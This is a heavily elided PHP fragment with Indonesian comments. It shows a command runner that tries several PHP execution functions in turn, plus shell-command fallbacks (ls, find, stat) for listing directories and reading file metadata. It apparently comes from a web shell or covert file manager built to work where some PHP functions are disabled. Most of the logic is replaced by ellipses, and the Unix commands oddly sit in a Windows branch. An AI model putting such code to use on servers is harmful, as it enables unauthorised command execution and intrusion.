...
function _run_cmd($cmd) {
    ...
    foreach ($_cmds as $fn) {
        ...
        if ($fn === 'shell_exec') {
            ...
            // pcntl_exec tidak mengembalikan output, tidak cocok
            continue;
        ...
        if ($success) {
            // jika output null, set empty string
...
// Fallback untuk scandir menggunakan command
...
if (!is_array($directoryContents)) {
    ...
    if ($commandAvailable) {
        ...
        if (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows') {
            ...
            $cmds[] = "ls -A1 {$esc}";
            $cmds[] = "ls -a {$esc} | grep -v '^\.$'";
            $cmds[] = "find {$esc} -maxdepth 1 -printf '%f\n' | tail -n +2";
        }
        foreach ($cmds as $listCmd) {
            ...
            if ($output !== false && trim($output) !== '') {
                ...
                foreach ($lines as $line) {
                    ...
                    if ($clean !== '' && $clean !== '.' && $clean !== '..') {
                        $directoryContents[] = $clean;
                    }
                }
                if (!empty($directoryContents)) break;
            }
        }
    }
...
foreach ($directoryContents as $item) {
    ...
    // fallback metadata via stat
    if (($fileSize === false || $fileModTime === false || $filePerms === false || $filePerms === '0000') && $commandAvailable && !(defined('PHP_OS_FAMILY') && PHP_OS_FAMILY==='Windows')) {
        $esc = escapeshellarg($itemPath);
...
<script>
// --- Same JavaScript as CAE 2.5, with all functions ---
